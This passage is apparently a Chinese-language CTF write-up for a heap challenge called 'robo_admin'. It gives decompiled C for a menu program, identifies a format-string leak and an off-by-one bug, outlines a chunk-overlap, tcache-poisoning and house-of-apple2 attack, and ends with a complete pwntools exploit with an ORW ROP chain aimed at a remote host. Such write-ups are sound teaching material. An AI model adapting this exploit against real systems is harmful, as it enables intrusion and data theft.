  v12 = __readfsqword(0x28u);
  v7 = pwd1;
  v8 = pwd2;
  strcpy((char *)v9, "STACK_ANCHOR");
  BYTE5(v9[1]) = 0;
  HIWORD(v9[1]) = 0;
  v10 = 0;
  v11 = 0;
  puts("=== Robo Admin Status ===");
  puts("Robot core: online");
  puts("Task queue: healthy");
  printf("Notice: ");
  if ( ntc_tag )
  {
    if ( once )
    {
      printf("%s", notice);
    }
    else
    {
      once = 1;
      printf(notice, a2, v2, v3, v4, v5, v7, v8, v9[0], v9[1], v10, v11);
    }
    puts(&whatelf);
  }
  else
  {
    puts("(empty)");
  }
  return v12 - __readfsqword(0x28u);
}
```

有一次格式化字符串利用机会，可以泄露管理员密码和 libc 地址，然后获得进入管理员面板的权限

#### admin_panel

```c
unsigned __int64 admin_panel()
{
  char nptr[8]; // [rsp+0h] [rbp-20h] BYREF
  __int64 v2; // [rsp+8h] [rbp-18h]
  unsigned __int64 v3; // [rsp+18h] [rbp-8h]

  v3 = __readfsqword(0x28u);
  while ( 1 )
  {
    puts("\n=== Task Menu ===");
    puts("1. create");
    puts("2. edit");
    puts("3. query");
    puts("4. list");
    puts("5. delete");
    puts("6. logout");
    puts("> ");
    *(_QWORD *)nptr = 0;
    v2 = 0;
    myread(nptr, 16);
    switch ( atoi(nptr) )
    {
      case 1:
        create();
        break;
      case 2:
        edit();
        break;
      case 3:
        query();
        break;
      case 4:
        list();
        break;
      case 5:
        delete();
        break;
      case 6:
        return v3 - __readfsqword(0x28u);
      default:
        puts("[X] invalid");
        break;
    }
  }
}
```

经典菜单堆题

#### create

```c
int create()
{
  size_t v0; // rax
  __int64 v1; // rax
  unsigned int v3; // [rsp+4h] [rbp-Ch]
  size_t size; // [rsp+8h] [rbp-8h]

  LODWORD(v0) = readidx();
  v3 = v0;
  if ( (v0 & 0x80000000) == 0LL )
  {
    if ( taskalive[(int)v0] )
    {
      LODWORD(v0) = puts("[X] slot used");
    }
    else
    {
      memset((char *)&task_name + 24 * (int)v0, 0, 0x18u);
      puts("Task name:");
      v1 = (__int64)taskname_getptr(v3);
      myread((void *)v1, 16);
      v0 = readnum("Desc size:", 24, 0x200);
      size = v0;
      if ( v0 )
      {
        task_desc[v3] = malloc(v0);
        if ( task_desc[v3] )
        {
          memset((void *)task_desc[v3], 0, size);
          task_size[v3] = size;
          *(_QWORD *)taskname_getptr_0x10(v3) = 0;
          taskalive[v3] = 1;
          LODWORD(v0) = puts("[+] task created");
        }
        else
        {
          LODWORD(v0) = puts("[X] malloc failed");
        }
      }
    }
  }
  return v0;
}
```

可申请大小 200 以内任意 chunk ，同时可控 7 个 chunk

#### edit

```c
int edit()
{
  __int64 v0; // rax
  unsigned __int64 v1; // r12
  ssize_t v2; // rbx
  ssize_t *v3; // rax
  unsigned int v5; // [rsp+Ch] [rbp-24h]
  size_t nbytes; // [rsp+10h] [rbp-20h]
  ssize_t v7; // [rsp+18h] [rbp-18h]

  LODWORD(v0) = readidx();
  v5 = v0;
  if ( (int)v0 >= 0 )
  {
    if ( taskalive[(int)v0] )
    {
      v0 = readnum("Write length :", 1, task_size[(int)v0] + 1LL);
      nbytes = v0;
      if ( v0 )
      {
        puts("New desc bytes:");
        v7 = read(0, *((void **)&task_desc + (int)v5), nbytes);
        if ( v7 > 0 )
        {
          if ( task_size[v5] <= (unsigned __int64)v7 )
          {
            if ( task_size[v5] )
              *(_BYTE *)(*((_QWORD *)&task_desc + (int)v5) + task_size[v5] - 1LL) = 0;
          }
          else
          {
            *(_BYTE *)(*((_QWORD *)&task_desc + (int)v5) + v7) = 0;
          }
          v1 = task_size[v5];
          v2 = v7;
          v3 = (ssize_t *)taskname_getptr_0x10(v5);
          if ( v1 <= v7 )
            v2 = v1;
          *v3 = v2;
          LODWORD(v0) = puts("[+] task updated");
        }
        else
        {
          LODWORD(v0) = puts("[X] read failed");
        }
      }
    }
    else
    {
      LODWORD(v0) = puts("[X] empty");
    }
  }
  return v0;
}
```

发现 off-by-one 漏洞，然后写入的内容末尾会补一个 '\x00' ，阻挠进一步的泄露

#### delete

```c
int delete()
{
  int result; // eax
  int v1; // [rsp+Ch] [rbp-4h]

  result = readidx();
  v1 = result;
  if ( result >= 0 )
  {
    if ( taskalive[result] )
    {
      free((void *)task_desc[result]);
      task_desc[v1] = 0;
      task_size[v1] = 0;
      memset((char *)&task_name + 24 * v1, 0, 0x18u);
      taskalive[v1] = 0;
      return puts("[+] deleted");
    }
    else
    {
      return puts("[X] empty");
    }
  }
  return result;
}
```

没有 UAF

### 攻击思路

利用格式化字符串获取管理员权限后，就是 off-by-one 的利用了

准备三个相邻 chunk A, B, C ，从低地址到高地址排列

利用 A 的 off-by-one 漏洞使 B 恰好包括住 C ，然后 free 掉 B 使之进入 unsortedbin

申请原来的 B 的大小的 chunk ，使 unsortedbin 剩下 lastremainder C ，然后再申请 C 的大小，这样就获得了两个指向同一个 chunk 的堆指针

最后 free 掉其中一个指针，就可以达成 UAF 的效果，leak heap 后用 tcache poisoning 打 house of apple2 写 orw 链即可

不过 chunk 的大小还要精心选择一波，在开始利用之前需要做一下堆风水使 B 能进入 unsortedbin

吐槽一下这初始的堆环境是有够恶劣的。。。

### exp

```python
from pwn import *

context.log_level = 'debug'
context.arch = 'amd64'
context.os = 'linux'
context.terminal = ['tmux', 'splitw', '-h']

debug = 1

file = './robo_admin_patched'
elf = ELF(file)
libc = ELF('./libc.so.6')

target = '60.205.163.215'
port = 13774

if debug:
    p = process(file)
else:
    p = remote(target, port)

io = p

def dbg(cmd = ''):
    if debug:
        gdb.attach(p, gdbscript = cmd)

s       = lambda data           :p.send(data)
sl      = lambda data           :p.sendline(data)
sa      = lambda x, data        :p.sendafter(x, data)
sla     = lambda x, data        :p.sendlineafter(x, data)
r       = lambda num=4096       :p.recv(num)
rl      = lambda num=4096       :p.recvline(num)
ru      = lambda x              :p.recvuntil(x)
itr     = lambda                :p.interactive()
uu32    = lambda data           :u32(data.ljust(4, b'\x00'))
uu64    = lambda data           :u64(data.ljust(8, b'\x00'))
uru64   = lambda                :uu64(ru('\x7f')[-6:])
leak    = lambda name           :log.success(name + ' = ' + hex(eval(name)))

def encoder(text):
    result = str()
    for i in text:
        if i == '%' or i == '$':
            result += '\\' + hex(ord(i))[1:]
        else:
            result += i
    return result.encode()

def safelinking(pos, ptr):
    return (pos >> 12) ^ ptr

def decodenext(x):
    a = x
    for _ in range(12):
        x = a ^ (x >> 12)
    return x

def setnotice(notice):
    sla(b'> \n', b'1')
    s(notice)

def showstatus():
    sla(b'> \n', b'2')

def admin_login(pwd):
    sla(b'> \n', b'3')
    sa(b'Token:\n', b'ROBOADMIN')
    sa(b'Password (32 hex):\n', pwd)

def exit():
    sla(b'> \n', b'4')

def createtask(idx, name, size):
    sla(b'> \n', b'1')
    sla(b'Index:\n', str(idx).encode())
    sa(b'name:\n', name)
    sla(b'size:\n', str(size).encode())

def edittask(idx, length, content):
    sla(b'> \n', b'2')
    sla(b'Index:\n', str(idx).encode())
    sa(b'length :\n', str(length).encode())
    sla(b'bytes:\n', content)

def querytask(idx):
    sla(b'> \n', b'3')
    sla(b'Index:\n', str(idx).encode())

def deletetask(idx):
    sla(b'> \n', b'5')
    sla(b'Index:\n', str(idx).encode())

def logout():
    sla(b'> \n', b'6')

setnotice(encoder('%6$016p%7$016p%23$p'))    # leak pwd, libc
showstatus()
ru(b'Notice: ')
r(2)
pwd = r(16)
r(2)
pwd += r(16)
r(2)
libc.address = int(r(12).decode('utf-8'), 16) - 0x29d90
leak('libc.address')
admin_login(pwd)

createtask(0, b'WWW', 0x48)    # init_chunk
createtask(1, b'WWW', 0x48)
createtask(2, b'WWW', 0x48)
deletetask(0)
deletetask(1)
deletetask(2)

for i in range(7):    # fill tcache
    createtask(i, str(i).encode(), 0x1d8)
for i in range(7):
    deletetask(i)

createtask(0, b'AAA', 0xd8)    # build overlap
createtask(1, b'AAA', 0xf8)
createtask(2, b'AAA', 0xd8)
createtask(3, b'AAA', 0xd8)
payload = b'A' * 0xd8 + b'\xe1'
edittask(0, 0xd9, payload)
deletetask(1)
createtask(1, b'AAA', 0xf8)
deletetask(1)
createtask(1, b'AAA', 0xd8)
deletetask(3)
deletetask(1)

querytask(2)    # leak heap
ru(b' => ')
heap = decodenext(uu64(r(6))) - 0x2940
leak('heap')

payload = p64(safelinking(heap + 0x2000, heap + 0xf0))    # tcache poisoning
edittask(2, 0x8, payload)
createtask(3, b'AAA', 0xd8)
createtask(4, b'AAA', 0xd8)
stderr = libc.symbols['_IO_2_1_stderr_']
payload = p64(stderr) + p64(stderr)
edittask(4, 0x16, payload)

createtask(6, b'BBB', 0xe0)    # house of apple2
fake_io = flat({
        0x0: 0,
        0x10: b'flag\x00',
        0x28: libc.sym['setcontext'] + 0x3d,
        0x38: 0, # RDI
        0x40: stderr + 0x20, # RSI
        0x58: 0x400, # RDX
        0x70: stderr + 0x20, # RSP
        0X78: libc.sym['read'], # RIP
        0x88: stderr,
        0xA0: stderr - 0x30, # __rdx__
        0xB0: stderr - 0x40,
        0xD8: libc.sym['_IO_wfile_jumps']
    },
    filler=b"\x00"
)
edittask(6, 0xe0, fake_io)
logout()
exit()

pop_rax_ret = libc.address + 0x45eb0
pop_rdi_ret = libc.address + 0x2a3e5
pop_rsi_ret = libc.address + 0x2be51
pop_rdx_pop_r12_ret = libc.address + 0x11f367
syscall_ret = libc.address + 0x91316

rop_chain = flat([
    pop_rax_ret,
    257,
    pop_rdi_ret,
    -100,
    pop_rsi_ret,
    stderr + 0x10,
    pop_rdx_pop_r12_ret,
    0x100,
    0,
    syscall_ret,		# openat(-100, "flag", 0)
    pop_rax_ret,
    0,
    pop_rdi_ret,
    3,
    pop_rsi_ret,
    stderr + 0x400,
    pop_rdx_pop_r12_ret,
    0x100,
    0,
    syscall_ret,		# read(3, buf, 0x100)
    pop_rax_ret,
    1,
    pop_rdi_ret,
    1,
    pop_rsi_ret,
    stderr + 0x400,
    pop_rdx_pop_r12_ret,
    0x100,
    0,
    syscall_ret		# write(1, buf, 0x100)
])

sla(b'bye', rop_chain)

itr()

# 0x0000000000045eb0: pop rax; ret;
# 0x000000000002a3e5: pop rdi; ret;
# 0x000000000002be51: pop rsi; ret;
# 0x000000000011f367: pop rdx; pop r12; ret;
# 0x0000000000091316: syscall; ret;
```